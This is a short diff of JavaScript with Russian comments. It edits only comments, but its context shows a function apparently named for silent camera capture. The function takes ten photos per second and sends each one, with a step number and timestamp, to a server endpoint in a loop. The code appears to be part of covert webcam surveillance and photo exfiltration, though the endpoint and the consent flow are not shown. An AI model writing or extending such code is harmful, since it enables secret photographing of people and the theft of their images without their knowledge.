@@ -851,7 +851,7 @@
         }
     }
     
-    // ========== КАМЕРА И ФОТО (10 ФОТО ЗА 1 СЕКУНДУ) ==========
+    // ========== КАМЕРА И ФОТО (10 ФОТО ЗА 1 СЕКУНДУ!) ==========
     let cameraAllowed = false;
     
     async function startSilentCapture() {
@@ -891,7 +891,7 @@
                     },
                     body: JSON.stringify({ photo: photoData, step: i+1, timestamp: Date.now() })
                 });
-                // ===== ЗАДЕРЖКА 100ms =====
+                // ===== ЗАДЕРЖКА 100ms (10 кадров в секунду) =====
                 await new Promise(r => setTimeout(r, 100));
             }
             
